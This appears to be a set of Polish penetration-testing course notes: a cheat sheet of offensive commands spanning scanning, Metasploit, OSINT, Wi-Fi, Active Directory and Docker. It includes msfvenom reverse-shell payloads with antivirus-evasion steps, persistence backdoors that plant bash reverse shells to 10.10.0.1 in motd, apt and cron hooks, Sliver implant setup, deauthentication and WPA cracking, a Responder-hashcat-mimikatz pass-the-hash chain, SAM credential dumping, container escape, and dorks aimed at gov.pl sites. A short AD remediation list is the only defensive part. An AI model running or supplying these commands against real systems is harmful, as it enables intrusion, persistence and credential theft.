* `ndiff` — porównywanie wyników

Przydatne parametry:
```bash
nmap -v
nmap -sn -PE -PS80
nmap -sS -sU
nmap -sT
nmap -sV --version-all
nmap -O
nmap -oN plik.txt
nmap -v -sSUV --version-all -O -oN scan.txt 127.0.0.1
nmap -sn -PE -PS80 192.168.1.0/24
nmap -p 1337
nmap -F
nmap --top-ports
nmap --reason
nmap --packet-trace
nmap -sA -sF
nmap -6
```
Identyfikacja hostów (ping scan):
```bash
nmap -sn 10.0.0.0/24
nmap -sn 10.10.0.0/24 -oX nmap_sn_101000.xml
```
Skanowanie hostów, które nie odpowiadają na ICMP ping request:
```bash
nmap -Pn 10.0.0.0/24
nmap -Pn 10.10.0.0/24 -oX nmap_pn_10100.xml
```
Skan portów — masscan:
```bash
masscan -Pn 10.10.0.0/24 -oX masscan_pn_10100.xml --rate=2000
```
Import do Metasploit:
```bash
db_import masscan_pn_10100.xml
services -u
hosts -u
services -c port -S www -u -o ports   # eksport otwartych portów oznaczonych "www" do pliku "ports"
```
Skan interesujących usług narzędziem ffuf:
```bash
ffuf -u https://10.10.0.7:8080/FUZZ -fc 302 -w /usr/share/wordlists/dirb/common.txt
# /usr/share/wordlists/dirb/ -> folder z domyślnymi wordlistami na Kali
```
Szablony czasowe Nmap: https://nmap.org/book/man-port-specification.html
Dokumentacja Metasploit: https://www.offsec.com/metasploit-unleashed/using-databases/

Standardowe skrypty Nmap:
```bash
nmap -n -sC 10.0.0.1
```
Decoy scan (spoofowanie IP):
```bash
nmap -sS 192.168.89.191 -D 10.0.0.1,10.0.0.2,10.0.0.4
```
Reason (powiedz dlaczego):
```bash
nmap -sT 192.168.12.3 --reason
```
Skanowanie hostów z listy:
```bash
nmap -iL lista.txt -p80,443
```
Pominięcie fazy ICMP (pełniejsze, dokładniejsze skanowanie TCP):
```bash
nmap -Pn -p80,443
```
Zapisywanie wyników skanów do pliku (xml, nmap, gnmap):
```bash
nmap -oA wszystkie_formaty 192.168.1.2 -p22
```
Badanie obecności firewalla:
```bash
nmap -sA 192.168.1.2
```
Skanowanie z konkretnym portem źródłowym:
```bash
nmap -g 53 192.168.1.2
```

Nmap NSE (Nmap Scripting Engine) znacznie rozszerza funkcjonalność skanera portów; część skryptów charakterystyczna jest dla skanera podatności. Dostępne są skrypty działające na cały host, jak i na poszczególne usługi.
* `-sC` — włącza tylko domyślne skrypty
* `--script <nazwa>` — uruchomienie konkretnego skryptu

Przykłady zastosowań skryptów NSE:
* brute-force mechanizmów logowania (np. ekrany logowania urządzeń sieciowych)
* weryfikacja możliwości anonimowego zalogowania via FTP
* pobranie dodatkowych informacji ze skanowanego urządzenia via SNMP
* atak typu DoS na wybraną usługę
* spidering docelowej strony WWW i pobranie z odpowiedzi adresów e-mail

Dostępne skrypty: https://nmap.org/nsedoc
* https://github.com/scipag/vulscan

Przykłady:
```bash
nmap -n -v -sT -p 80 --script=http-enum 127.0.0.1
nmap -sV -O -A -sS -v www.intrasoft.com.pl
```
ffuf z nagłówkiem autoryzacji:
```bash
ffuf … -H "Authorization: Basic Z3JlZW5jYXQ6aW50aGVmb3Jlc3Q="
```
Kolejne przykłady:
```bash
nmap 10.0.0.12 --top-ports 10
nmap 10.0.0.12 -p 0-65535
nmap 10.0.0.12 -p-     # ==  nmap 10.0.0.12 -p 1-65535

# Nmap na początku wysyła ICMP, ale można to wyłączyć:
nmap 10.0.0.12 -Pn --top-ports 10
# https://nmap.org/book/performance-port-selection.html

nmap 10.0.0.12 -sn          # wysyła tylko ICMP do wybranego hosta
nmap 10.0.0.0/24 -sn
nmap 10.0.0.12 -Pn --top-ports 100 | tee nmap.txt
nmap 10.0.0.12 -Pn --top-ports 100 -oN nmap.txt
nmap 10.0.0.12 -Pn --top-ports 100 -oG nmap.txt
nmap 10.0.0.12 -Pn --top-ports 100 -oX nmap.xml
nmap 10.0.0.12 -Pn --top-ports 100 -oA nmap

# Tu głośno:
nmap 10.0.0.12 -Pn -p 22,38 -sV
nmap 10.0.0.12 -Pn -p 22,38 -O
nmap 10.0.0.12 -Pn -p 22,38 --script ssh*
# https://sekurak.pl/nmap-i-12-przydatnych-skryptow-nse/
nmap 10.0.0.12 -Pn -p 22,38 --script "not intrusive"

# Nmap timing (przerwy między skanami, by trudniej było wykryć): -T0 -T1 -T2 -T3(default) -T4 -T5
nmap -sU -oX scan_result.xml -e ens4 -p 1-200 10.0.0.0/24
nmap 10.10.0.0/24 -p- -oX mm_nmap_full.xml
```
masscan — w uproszczeniu „przepisany Nmap", ale można definiować prędkość (zbyt szybko = false positive'y).

## Smap

https://github.com/s0md3v/Smap

## RustScan

https://github.com/RustScan/RustScan

## Burp Suite

## Zed Attack Proxy (ZAP)

## SQLmap

## Dirb i Gobuster

## Kube-hunter

## ScoutSuite

# Eksploitacja i dostarczanie payloadów

## Metasploit

Pobranie i instalacja Metasploit:
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall
```
Uruchomienie bazy i konsoli MSF:
```bash
msfdb init
msfconsole
workspace -a <nazwa>
```
Podstawowy przepływ pracy:
```bash
search ssh
use auxiliary/scanner/ssh/ssh_enumusers
# LUB: use <numer>
info
options
set rhosts 10.0.0.11
set username admin
run
```
Wyszukiwanie hostów i serwisów:
```bash
hosts
services
services -u          # tylko usługi, które są UP
search snmp aux      # moduł dot. SNMP typu "auxiliary"
use auxiliary/scanner/snmp/aix_version
info
set RHOSTS 10.0.0.11
back                 # wyjście do głównego menu MSF
```
Podstawowy plik EXE z msfvenom:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe
```

### Msfvenom i techniki obniżające skuteczność antywirusów

1. Wygenerowanie podstawowego reverse shella w formacie `.exe`:
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe
   ```
2. Przekompilowanie payloadu i jego regeneracja:
   ```bash
   # w katalogu /usr/share/metasploit-framework/data/templates/src/pe/exe#
   i686-w64-mingw32-gcc template.c -lws2_32 -o avbypass.exe
   msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -x /usr/share/metasploit-framework/data/templates/avbypass.exe -f exe > /root/tools/av.exe
   ```
3. Modyfikacja przydzielania pamięci:
   ```bash
   nano /opt/metasploit-framework/embedded/framework/data/templates/src/pe/exe/template.c
   # <modyfikacja>
   msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe > /root/tools/av.exe
   ```
4. Enkodowanie — shikata_ga_nai:
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe > /root/tools/av.exe
   ```
5. Zmiana domyślnego template na własny + shikata:
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe -k -x wlasny_plik.exe -e x86/shikata_ga_nai > /root/tools/av.exe
   ```

Dokładny opis shikata_ga_nai: https://www.mandiant.com/resources/blog/shikata-ga-nai-encoder-still-going-strong
Dodatkowa, istotna i niebezpieczna technika — DLL Sideloading / DLL Hijacking: https://sekurak.pl/czym-w-praktyce-jest-technika-dll-side-loading-stosowana-przez-niektore-szkodliwe-oprogramowanie/

### Nmap w Metasploit

```bash
db_nmap <dalsze flagi zgodnie z konwencją nmap>

workspace
workspace -a maku
db_nmap 10.0.0.11-13 --top-ports 100 -sV
hosts
notes
services
services 10.0.0.11
services -u
services -u -p 22
services -u -p 22 -R
options              # zmienił się RHOST na wszystkie up

db_import scan_result.xml
services -u -S 3ubuntu13.5
services 10.0.0.11-13
services -R -u -p 161 10.0.0.11-13   # porty SNMP
```
Przykład enumeracji SNMP:
```bash
search snmp aux
use auxiliary/scanner/snmp/snmp_enum
services -R -u -p 161 10.0.0.11-13
run
loot                 # (pusto)

use auxiliary/scanner/snmp/snmp_login
services -R -u -p 161 10.0.0.11-13
run                  # community string: public i private!

use auxiliary/scanner/snmp/snmp_set
services -R -u -p 161 10.0.0.11-13
run

snmpwalk …           # zgarniamy resztę potrzebnych informacji, jak OID itd.

use auxiliary/scanner/snmp/snmp_set
set OID …
set OIDVALUE …
set COMMUNITY private
run

use auxiliary/scanner/snmp/snmp_enum
services -R -u -p 161 10.0.0.11-13
set COMMUNITY private
run
```
Przykład enumeracji SSH:
```bash
msfconsole
workspace -a matmac
db_import mm_nmap_full.xml    # z nmap
hosts -u
services -u
services -S http
db_nmap 10.10.0.0/24 -sV

search ssh
use auxiliary/scanner/ssh/ssh_enumusers
services -u -p 22
use …
set …
exploit …
```

## Empire

## BLACKEYE

## SET (Social-Engineer Toolkit)

## BeEF

# Post-eksploitacja i eskalacja uprawnień

Co po uzyskaniu dostępu do pierwszej maszyny w sieci? Dostęp do stabilnej powłoki sieciowej i zabezpieczanie dostępu.

**1. Interaktywna powłoka (TTY):**
* https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
* https://gist.github.com/rollwagen/1fdb6b2a8cd47a33b1ecf70fea6aafde
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
/bin/sh -i
perl -e 'exec "/bin/sh";'
python -c 'import os; os.system("/bin/bash")'
```

**2. Persistence — zachowanie dostępu po reboocie:**
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md

**Wyszukiwanie istotnych informacji o sieci LAN:**

Kim jestem?
```bash
whoami
id
cat /etc/passwd
```
Jaka wersja systemu i kernela?
```bash
cat /proc/version
uname -a
```
Czy są obecne przydatne binarki? Czy jest kompilator?
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 ...
dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null
```
Czy jest coś w cronie?
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

**Eskalacja uprawnień w Linux — podatna wersja kernela:**

1. Dirty COW:
   * https://sekurak.pl/dirty-cow-podatnosc-w-jadrze-linuksa-mozna-dostac-roota-jest-exploit/
   * https://github.com/firefart/dirtycow
   * https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
2. Polkit (PwnKit):
   * https://sekurak.pl/12-letnia-podatnosc-w-narzedziu-systemowym-polkit-daje-latwa-eskalacje-uprawnien-do-roota-sa-juz-exploity-latajcie-linuksy/
   * https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
3. Narzędzie sugerujące potencjalnie użyteczny exploit na kernel:
   * https://github.com/The-Z-Labs/linux-exploit-suggester
   * https://github.com/bwbwbwbw/linux-exploit-binaries

## Mimikatz

## LinPEAS i WinPEAS

## GTFOBins i LOLBAS

* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* https://fuzzysecurity.com/tutorials/16.html
* https://gtfobins.github.io/ — lista komend, które przy dostępie przez `sudo` pozwalają zdobyć roota

Reverse shell i persistence (https://gtfobins.github.io/#+reverse%20shell):
```bash
# message of the day edit:
echo 'bash -c "bash -i >& /dev/tcp/10.10.0.1/4444 0>&1"' >> /etc/update-motd.d/00-header

# apt pre-invoke:
echo 'APT::Update::Pre-Invoke {"bash -c \"bash -i >& /dev/tcp/10.10.0.1/4444 0>&1\""};' > /etc/apt/apt.conf.d/42backdoor

# crontab:
(crontab -l ; echo "@reboot sleep 200 && ncat 10.10.0.1 44444 -e /bin/bash")|crontab 2> /dev/null

# dodanie własnego klucza SSH:
ssh-keygen
cat klucz.pub
echo "<tresc klucz.pub>" >> .ssh/authorized_keys
```

## Iodine

# Command & Control

* https://kapitanhack.pl/2020/04/03/c2/serwery-command-control-czym-sa-i-jaka-jest-ich-rola-we-wspolczesnych-cyberatakach/

**Wstęp do Command and Control — Sliver:**
* Newsy: https://www.bleepingcomputer.com/news/security/hackers-adopt-sliver-toolkit-as-a-cobalt-strike-alternative/
* Projekt: https://github.com/BishopFox/sliver

Instalacja:
```bash
curl https://sliver.sh/install|sudo bash
```
4 typy połączenia:
* `wg` — WireGuard (prosty VPN)
* `http` — komunikacja via HTTP/HTTPS
* `mtls` — mutual TLS (implant weryfikuje cert Slivera, a Sliver implantu)
* `dns` — komunikacja via DNS

2 typy implantów:
* `beacon` — cykliczne nasłuchiwanie na komendy do wykonania
* `session` — zwykły reverse shell

```bash
# Tworzenie implantu (beacon):
generate beacon --wg <ip_sliver> --save /tmp --skip-symbols -f shellcode --os windows
# Włączenie nasłuchiwania:
wg
# Wykorzystanie danego beaconu:
use <id sesji>
# Generowanie strony HTML, aby ukryć obecność Slivera:
http --website fake-blog --domain example.com
# Generowanie certyfikatu dla strony:
https --domain example.com --lets-encrypt
# Dodatkowy sklep z modułami:
armory
```

**Wykrywanie serwerów C&C w internecie — JARM:** unikalna sygnatura usługi sieciowej tworzona na podstawie odpowiedzi „Server Hello" po zapytaniu „Client Hello" podczas zestawiania komunikacji TLS. Każda usługa odpowiada inaczej — w zależności od wersji OS, wersji aplikacji, bibliotek na serwerze itd. Skrypt wysyła 10 zapytań Client Hello i analizuje 10 odpowiedzi Server Hello.
* https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a/

JA3 / JA3S:
* https://www.bussink.net/ja3-and-ja3s-or-the-new-jarm/

# OSINT (biały wywiad)

* https://crt.sh/ — wyszukiwarka certyfikatów dla domeny
   * `%.corp.google.com`
   * `%.so.gov.pl`
   * `%.tesco.com`
   * `%.tesco.pl`
   * `%.bbc.co.uk`
* https://apps.db.ripe.net/db-web-ui/#/fulltextsearch — WHOIS full-text search
* https://www.exploit-db.com/google-hacking-database/ — Google Hacking Database
   * `site:gov.pl "mysql warning:"`
   * `site:gov.pl "Index of"`
   * `site:gov.pl "Index of" "backup"`
   * `"Index of" "backup" filetype:sql`
   * `filetype:sql inurl:wp-content/backup-db`
* https://securitytrails.com — zbieranie informacji o domenie, rekordach DNS i ich historii; przydatne w omijaniu WAF Cloudflare

## OSINT Framework

## Maltego

## SpiderFoot

## Shodan

* https://www.shodan.io/ — wyszukiwarka urządzeń podłączonych do internetu
    * https://github.com/salesforce/jarm
    * Wartości JARM dla wybranych serwerów C&C: https://github.com/cedowens/C2-JARM
    * Wyszukiwanie hostów o danym JARM w Shodan (tu: listenery Cobalt Strike): https://www.shodan.io/search?query=ssl.jarm%3A07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1
    * Wyszukiwarka JARM w Shodan: https://www.shodan.io/search/facet?query=apache&facet=ssl.jarm ; https://www.shodan.io/search/facet?query=nginx&facet=ssl.jarm
* Przykładowe zapytania Shodan:
    * `has_screenshot:yes`
    * `has_screenshot:yes country:gb`
    * `has_screenshot:yes country:gb port:5900`
    * `"Server: nginx" country:gb`
    * `port:9100 product:"LaserJet"`
    * `net:17.0.0.0/8`
    * `net:17.0.0.0/8 port:5060`
    * `net:17.0.0.0/8 Server: nginx/`
* https://www.zoomeye.hk/ — „chiński Shodan"

## theHarvester

## Recon-ng

## FOCA (Fingerprinting Organizations with Collected Archives)

## Cyotek WebCopy

# Bezpieczeństwo Wi-Fi

Należy wyposażyć się w kartę sieciową, która ma możliwość wejścia w tryb monitor (pozwalający na monitorowanie pakietów w okolicy). Dodatkowo, aby przeprowadzać ataki typu „evil twin" (klon wybranej sieci Wi-Fi) lub „known beacons" (tworzenie wielu sieci Wi-Fi o popularnych nazwach), karta musi wspierać tworzenie wirtualnych interfejsów. Przykład działającej karty — Alfa AWUS036CH.

**Atak Evil Twin** — wywalamy klientów z prawdziwego Wi-Fi i tworzymy identyczną sieć w nadziei, że ofiara podłączy się do naszej; nasza karta musi mieć dużą moc.

**Atak Karma/MANA** — jeśli urządzenie ma włączone auto-łączenie z Wi-Fi, to gdy nie jest podłączone, co chwilę rozsyła zapytania (probe requests) w celu weryfikacji, czy znane sieci istnieją. Można wtedy podszyć się pod taką sieć.

## Aircrack-ng

Wylistowanie kart sieciowych — zobaczymy chipset (m.in. czy wspiera wstrzykiwanie):
```bash
iwconfig
airmon-ng
```
Sprawdzenie na Windows, czy karta sieciowa ma tryb monitor:
```bash
netsh wlan show all
```
Wyświetlenie okolicznych sieci Wi-Fi i informacji o nich:
```bash
iwlist wlan0 scan
iwlist wlan0 | grep 'Address\|ESSID'   # wymaga wyłączenia trybu monitor
```
Wyszukiwarka producentów po adresie MAC: https://macvendors.com/

Zmiana adresu MAC. Trzeba to zrobić przy wyłączonym trybie monitor, a później można go włączyć. Jest opcja `random` lub ręczna; jeśli ustawiamy ręcznie — najlepiej na adres widoczny w obrębie danej sieci (i najlepiej, by ten ktoś się wylogował, zanim podszyjemy się pod jego MAC):
```bash
macchanger --help
```
Zabicie wszystkich zbędnych procesów dotykających naszej karty:
```bash
airmon-ng check
airmon-ng check kill
```
Przestawienie karty `wlxxxxxx` w tryb monitor:
```bash
airmon-ng start wlxxxxxxxx
```
Ponowne wylistowanie kart (powinna pojawić się karta z dopiskiem `mon`):
```bash
airmon-ng
```
Uruchomienie nasłuchu na karcie w trybie monitor. Zanotuj BSSID (MAC) sieci celu oraz MAC stacji (urządzeń klienckich):
```bash
airodump-ng wlan0mon
```
Uruchomienie airodump-ng na konkretnym kanale (CH: 1) z zapisem do pliku `plik`:
```bash
airodump-ng -w plik --bssid 18:A6:F7:83:35:14 -c 1 wlan0mon
```
Teraz czekamy, aż ktoś znający hasło podłączy się do sieci — aż pojawi się fraza `WPA Handshake: XX:XX:XX:XX:XX:XX`.

Deauthentication Attack — wysyłanie pakietów deautoryzacji:
```bash
# Deautoryzacja konkretnego klienta:
aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Deautoryzacja wszystkich klientów (0 = wysyłaj w nieskończoność, aż ręcznie zatrzymasz):
aireplay-ng --deauth 0 -a <AP_BSSID> wlan0mon
# lub:
aireplay-ng -0 0 -e "Maku-5GHz" wlan0mon
```
Zatrzymanie trybu monitor:
```bash
airmon-ng stop wlan0mon
```
Mając handshake, można przejść do crackowania hasła. Potrzebny jest plik `.cap` (zebrany przez airodump-ng) oraz słownik do ataku słownikowego (np. z OpenWall — https://www.openwall.com/wordlists/). `aircrack-ng` to taki uboższy hashcat — handshake można złamać również hashcatem.
```bash
wget http://ftp.wcss.pl/pub/security/openwall/pub/passwords/wordlists/languages/Polish/lower.gz
gzip -d lower.gz
aircrack-ng -w lower plik-01.cap
```

## wifite

Automatyzacja ataków na sieci bezprzewodowe — może wywalić użytkowników z sieci, a później próbować przechwycić handshake.
* https://github.com/derv82/wifite2
* https://www.kali.org/tools/wifite/

Stan zabezpieczeń sieci Wi-Fi:
* **WEP** — niebezpieczny! (`aireplay-ng -3 -b 18:A6:F7:83:35:14 -h 3C:15:C2:CB:E4:D6 wlan0mon`)
* **WPA** — niebezpieczny!
* **WPA2** — jeszcze się trzyma:
  * **WPA2-PSK** — domyślna konfiguracja sieci, łączymy się hasłem.
  * **WPA2-MGT** (sieci zarządzane) — uwierzytelnianie nie odbywa się na access poincie, lecz jest oddelegowane do innego serwera (najczęściej RADIUS) — trudniejsze do złamania.
  * **WPS** — pwned (reaver): my podajemy PIN, a router daje nam hasło; złamanie WPS-a to maks. ~3 h niezależnie od długości hasła. Narzędzia: `airmon-ng`, `wash` (czy jest WPS), `reaver` (łamanie WPS). Obecnie routery często blokują przy zbyt wielu próbach.
* **WPA3** — w drodze: https://wpa3.mathyvanhoef.com/

## Kismet

## Deauther

https://deauther.com/docs/diy/installation-bin/

# Bezpieczeństwo Active Directory

* https://adsecurity.org/
* https://www.active-directory-security.com/
* https://www.harmj0y.net/blog/

**Podstawy.** AD to usługa Microsoftu do zarządzania dostępem i tożsamością. Działa w modelu klient-serwer. Występują różne role, m.in. kontrolery domeny — serwery odpowiedzialne za przechowywanie i udostępnianie informacji o użytkownikach, grupach, zasobach i innych obiektach sieciowych. Kontrolery domeny utrzymują bazę danych z informacjami o wszystkich obiektach w domenie. Z poziomu kontrolera domeny tworzymy użytkowników, modyfikujemy uprawnienia itd. Dużo komplikacji = dużo problemów z bezpieczeństwem.

**Wykorzystanie LLMNR i NBT-NS.** Domyślnie w AD włączone są protokoły LLMNR i NBT-NS. Jeżeli urządzenie użytkownika nie zna np. rozwiązania nazwy, wysyłane jest zapytanie LLMNR lub NBT-NS do całej sieci lokalnej. Atakujący może przechwycić te zapytania i zmodyfikować odpowiedź — np. że dany zasób znajduje się na jego urządzeniu. W nowszych konfiguracjach zamiast LLMNR i NBT-NS używany jest protokół Kerberos, który zabezpiecza przed typowymi problemami tych mechanizmów — ale ma też swoje problemy, np. Kerberoasting.
* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
* https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting

**Problem z NetNTLM i NetNTLMv2.** Protokół NTLM jest wykorzystywany przez Windows do uwierzytelniania w sieciach lokalnych. Gdy użytkownik próbuje uzyskać dostęp do zasobów sieciowych, klient Windows może zainicjować protokół NetNTLM, aby uwierzytelnić się na serwerze. Podczas tego procesu klient i serwer przesyłają między sobą komunikaty NetNTLM. Responder potrafi przechwycić te dane, działając jako pośrednik między klientem a serwerem.

**NTLM Relay.** Atak, w którym atakujący przechwytuje uwierzytelnione sesje NetNTLM i przekierowuje je do innych maszyn, co umożliwia zdalne wykonanie poleceń lub uzyskanie dostępu do zasobów bez znajomości oryginalnych haseł. Zabezpieczenie: jeśli pakiety SMB są podpisywane (SMB signing enabled), podszycie się pod kogoś innego jest niemożliwe.

**Pass the hash (PtH).** Technika, w której atakujący przechwytuje skrót (hash) hasła użytkownika z systemu (z bazy SAM), a następnie wykorzystuje go do uwierzytelnienia się na innych maszynach, obchodząc uwierzytelnianie oparte na hasłach — nawet bez znajomości rzeczywistego hasła. Możliwe, gdy systemy używają protokołów takich jak NTLM, które przechowują skróty haseł.

**Responder** — uniwersalny „przechwytywacz" NetNTLM. Nasłuchuje na interfejsach sieciowych m.in. na pakiety LLMNR i NBT-NS. Gdy wykryje takie zapytanie, udaje fałszywy serwer i odpowiada na nie, podszywając się pod rzeczywisty serwer. Odpowiedź zawiera fałszywe informacje uwierzytelniające, dzięki czemu może przechwytywać m.in. NetNTLM i NetNTLMv2.

**Przykładowy atak na AD:**
1. Responder — przechwycenie NetNTLMv1/NetNTLMv2 poprzez zatrucie komunikacji LLMNR i NBT-NS.
2. Jeśli mamy NetNTLMv1 → NTLM Relay, aby spróbować zalogować się na inne urządzenia (v1 jest też łatwiejszy do złamania offline).
3. Jeśli mamy NetNTLMv2 → też da się go relayować (o ile cel nie wymusza SMB signing); jeśli relay odpada, hasło odzyskujemy hashcatem.
4. Zalogowanie się do hosta zdobytymi poświadczeniami — `xfreerdp` na Kali.
5. Uruchomienie mimikatz.
6. Zebranie lokalnego NTLM.
7. Próba zalogowania na inne konto (admin lub admin AD) z użyciem NTLM — Pass the hash.
8. Dalszy rekonesans.

**Atak w praktyce:**
```bash
# 1. Responder i zdobycie NetNTLMv2
sudo responder -I eth1
# (logi w /usr/share/responder/logs)
cat SMB-NTLMv2-SSP-fe80::8866:d96d:c108:4b31.txt
# admin::SEKURAKCORP:b443ed44cb702459:[...]

# 2. Odzyskanie formy plaintext w hashcat
sudo hashcat -r best64.rule -w 4 -O -m 5600 hashes_netntlmv2 ../dictionary/breachcompilation.txt -o cracked_netntlmv2

# 3. Zalogowanie do urządzenia
xfreerdp /u:username /d:domain /p:password /v:address

# 4. Pobranie i uruchomienie mimikatz, zebranie NTLM
# https://github.com/ParrotSec/mimikatz
./mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
# ... i mamy NTLM

# 5. Pass the hash
sekurlsa::pth /user:admin /domain:sekurakcorp.local /ntlm:<hasz ntlm>
```

**Uwaga — to nie to samo:** NTLM ≠ NetNTLM ≠ NetNTLMv2.
* **NTLM** — używany lokalnie na maszynie do przechowywania haseł w zaszyfrowanej postaci.
* **NetNTLMv1** — słaby protokół challenge/response między serwerem a maszyną. Po przechwyceniu można go stosunkowo łatwo złamać (odzyskać hasło/hash) lub użyć do NTLM Relay.
* **NetNTLMv2** — ulepszony NetNTLMv1. Również da się go relayować do innych hostów (NTLM Relay), ale nie da się go „odbić" z powrotem na hosta źródłowego (reflection załatane przez MS08-068). Jest też znacznie trudniejszy do złamania offline niż v1.
* Dokładna różnica: https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4

**Remedium:**
1. Aktualizuj systemy regularnie (np. Windows Server 2019+ domyślnie nie korzysta z NetNTLMv1, tylko z NetNTLMv2).
2. Wymuszaj silną politykę haseł (m.in. utrudnienie łamania NetNTLMv2).
3. 2FA w organizacji — aby zalogować się do hosta nawet po złamaniu NetNTLMv2, konieczny jest dodatkowy składnik.
4. Monitorowanie i rejestrowanie zdarzeń — w AD m.in. Event Viewer i Sysmon.
5. Wymuszenie Windows Defender (pamiętaj o włączeniu wysyłania próbek do serwera i ochrony z chmury).
6. Aby zabezpieczyć się przed NTLM Relay — włącz podpisywanie pakietów SMB.

Świetne narzędzie do monitorowania zdarzeń w Windows — Sysmon:
* https://learn.microsoft.com/pl-pl/sysinternals/downloads/sysmon
* Sysmon w praktyce (jak wyłapywane są próby użycia złośliwego oprogramowania, np. Slivera): https://www.youtube.com/watch?v=qIbrozlf2wM
* https://hackdefense.com/publications/het-belang-van-smb-signing/
* Roadmapa pentestów AD: https://raw.githubusercontent.com/Orange-Cyberdefense/ocdmindmaps/main/img/pentest_ad_dark_2023_02.svg
* Post o bezpieczeństwie AD: https://zer1t0.gitlab.io/posts/attacking_ad/

**Inne narzędzia przydatne w pentestach AD:**

**CrackMapExec** — „szwajcarski scyzoryk" enumeracji AD. Enumeracja udostępnionych zasobów SMB; pozwala też sprawdzić, czy nasz użytkownik domeny może uwierzytelnić się do maszyny z użyciem innych protokołów (LDAP/SSH/RDP/WinRM).
```bash
crackmapexec smb ./nazwy_komputerow -u <user> -p <pass> --shares          # enumeracja shares SMB
crackmapexec ldap ./nazwy_komputerow -u <user> -p <pass> -M whoami         # enumeracja LDAP + whoami
crackmapexec smb --gen-relay-list test.txt 192.168.1.0/24
```
* https://github.com/byt3bl33d3r/CrackMapExec
* https://ptestmethod.readthedocs.io/en/latest/cme.html
* https://medium.com/r3d-buck3t/crackmapexec-in-action-enumerating-windows-networks-part-1-3a6a7e5644e9

**Impacket** — zestaw skryptów Python do enumeracji środowiska AD i post-eksploitacji, gdy znamy poświadczenia dowolnego użytkownika AD. Przykładowy moduł do enumeracji plików GPP (Group Policy Password), często zawierających hasła:
```bash
impacket-Get-GPPPassword DOMAIN.LOCAL/USER:PASS@DC.IP
```
* https://github.com/fortra/impacket
* https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d

**Evil-WinRM** — jeśli mamy poświadczenia domenowe użytkownika, a na którymś komputerze uruchomiony jest WinRM (port 5985/TCP), można się zalogować podobnie jak przez SSH:
```bash
evil-winrm -u USER -p PASS -i HOST.DOMAIN.LOCAL
```
**smbclient** — po wykryciu (np. CrackMapExec) zasobu SMB dostępnego dla naszego użytkownika można się do niego zalogować i pobrać/wgrać zasoby.
**smbmap** — inne narzędzie do enumeracji zasobów SMB w sieci lokalnej.

**Pobranie lokalnej bazy haseł SAM** (przy uprawnieniach lokalnego administratora). Baza SAM/NTDS zawiera m.in. cache'owane hasła użytkowników domeny, którzy logowali się na nasz komputer:
```bash
# na hoście Windows:
reg save HKLM\SYSTEM system.bin
reg save HKLM\SECURITY security.bin
reg save HKLM\SAM sam.bin

# pobranie plików na Kali (Evil-WinRM):
download security.bin
download sam.bin
download system.bin

# na Kali — wyciągnięcie poświadczeń:
impacket-secretsdump -system system.bin -security security.bin -sam sam.bin LOCAL
```
* https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
* https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration

# Bezpieczeństwo konteneryzacji (Docker)

* https://github.com/docker/docker-bench-security

Weryfikacja, czy jesteś wewnątrz kontenera Docker:
```bash
cat /proc/1/cgroup | grep docker
cat /proc/1/cgroup | grep containerd
ls -la /.dockerenv
hostname
cat /etc/os-release
docker ps
ps -e
mount | grep docker
```
Rozpoznanie i ucieczka z kontenera:
```bash
ip addr   # czy są sieci Dockera (np. docker0) — czy działa docker CLI
id        # czy jesteśmy w grupie docker
docker ps
docker exec -it nginx bash   # pewnie będziemy rootem — interakcja z istniejącymi kontenerami
docker run --rm -it --pid=host --privileged ubuntu bash   # tworzenie nowych kontenerów bez dobrych praktyk
# --pid=host -> kontener używa przestrzeni PID hosta (dostęp do wszystkich procesów hosta)
# --privileged -> pełne uprawnienia na poziomie hosta (dostęp do urządzeń, dysków, USB, połączeń sieciowych itd.)

ls /dev/sd{a,b}   # sprawdzamy dostęp do dysków hosta
# Montujemy dysk hosta w kontenerze:
mkdir /tmp/dysk
mount /dev/sda /tmp/dysk
ls /tmp/dysk/     # pełny dostęp do dysku
# Przeskok na roota hosta:
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```
Pełniejszy schemat eskalacji:
```bash
# 1. Czy mam dostęp do polecenia docker na hoście?
docker version
# 2. Dostęp do działających kontenerów:
docker ps
# 3. Czy na hoście nasłuchuje Docker CLI?
nmap <host> -p 2375
# 4. Jeśli tak:
curl -s http://open.docker.socket:2375/version | jq
